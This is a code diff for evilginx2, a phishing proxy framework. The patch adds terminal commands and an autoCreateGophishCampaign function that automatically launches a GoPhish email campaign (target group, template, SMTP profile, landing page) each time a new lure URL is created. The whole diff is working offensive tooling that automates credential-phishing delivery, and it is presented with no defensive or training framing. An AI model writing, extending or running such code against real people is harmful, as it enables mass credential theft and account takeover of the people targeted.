@@ -25,6 +25,7 @@ import (
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 	"github.com/kgretzky/evilginx2/parser"
+	gp_models "github.com/kgretzky/evilginx2/gophish/models"
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
@@ -383,6 +384,33 @@ func (t *Terminal) handleConfig(args []string) error {
 					t.cfg.SetGoPhishInsecureTLS(false)
 					return nil
 				}
+			case "auto_campaign":
+				switch args[2] {
+				case "true":
+					t.cfg.SetGoPhishAutoCampaignEnabled(true)
+					log.Info("gophish auto-campaign creation enabled")
+					return nil
+				case "false":
+					t.cfg.SetGoPhishAutoCampaignEnabled(false)
+					log.Info("gophish auto-campaign creation disabled")
+					return nil
+				}
+			case "auto_group":
+				t.cfg.SetGoPhishAutoCampaignField("group", args[2])
+				log.Info("gophish auto-campaign group set to: %s", args[2])
+				return nil
+			case "auto_template":
+				t.cfg.SetGoPhishAutoCampaignField("template", args[2])
+				log.Info("gophish auto-campaign template set to: %s", args[2])
+				return nil
+			case "auto_smtp":
+				t.cfg.SetGoPhishAutoCampaignField("smtp", args[2])
+				log.Info("gophish auto-campaign SMTP set to: %s", args[2])
+				return nil
+			case "auto_page":
+				t.cfg.SetGoPhishAutoCampaignField("page", args[2])
+				log.Info("gophish auto-campaign page set to: %s", args[2])
+				return nil
 			}
 		case "telegram":
 			switch args[1] {
@@ -2278,7 +2306,15 @@ func (t *Terminal) handleLures(args []string) error {
 					Phishlet: args[1],
 				}
 				t.cfg.AddLure(args[1], l)
-				log.Info("created lure with ID: %d (strategy: %s, length: %d chars)", len(t.cfg.lures)-1, strategy, len(lurePath))
+				lureID := len(t.cfg.lures) - 1
+				log.Info("created lure with ID: %d (strategy: %s, length: %d chars)", lureID, strategy, len(lurePath))
+
+				// Auto-create GoPhish campaign if enabled
+				if t.cfg.GetGoPhishAutoCampaignEnabled() {
+					if err := t.autoCreateGophishCampaign(l, args[1], lureID); err != nil {
+						log.Warning("gophish auto-campaign: %v", err)
+					}
+				}
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments")
@@ -4029,6 +4065,54 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 }
 
 
+
+// autoCreateGophishCampaign creates a GoPhish campaign for a newly created lure
+func (t *Terminal) autoCreateGophishCampaign(l *Lure, phishletName string, lureID int) error {
+	groupName := t.cfg.GetGoPhishAutoCampaignGroup()
+	templName := t.cfg.GetGoPhishAutoCampaignTemplate()
+	smtpName := t.cfg.GetGoPhishAutoCampaignSMTP()
+	pageName := t.cfg.GetGoPhishAutoCampaignPage()
+
+	if groupName == "" || templName == "" || smtpName == "" {
+		return fmt.Errorf("auto-campaign requires group, template, and smtp to be configured (use: gophish auto_group/auto_template/auto_smtp)")
+	}
+
+	// Build the base URL for this lure
+	var baseURL string
+	if l.Hostname != "" {
+		baseURL = "https://" + l.Hostname + l.Path
+	} else {
+		pl, err := t.cfg.GetPhishlet(phishletName)
+		if err != nil {
+			return fmt.Errorf("phishlet lookup: %v", err)
+		}
+		purl, err := pl.GetLureUrl(l.Path)
+		if err != nil {
+			return fmt.Errorf("lure URL: %v", err)
+		}
+		baseURL = purl
+	}
+
+	campaignName := fmt.Sprintf("%s-lure-%d", phishletName, lureID)
+
+	c := gp_models.Campaign{
+		Name: campaignName,
+		Template: gp_models.Template{Name: templName},
+		SMTP:     gp_models.SMTP{Name: smtpName},
+		Groups:   []gp_models.Group{{Name: groupName}},
+		URL:      baseURL,
+	}
+	if pageName != "" {
+		c.Page = gp_models.Page{Name: pageName}
+	}
+
+	if err := gp_models.PostCampaign(&c, 1); err != nil {
+		return fmt.Errorf("PostCampaign: %v", err)
+	}
+
+	log.Success("auto-created gophish campaign '%s' (id: %d) with URL: %s", campaignName, c.Id, baseURL)
+	return nil
+}
 
 func (t *Terminal) filterInput(r rune) (rune, bool) {
 	switch r {
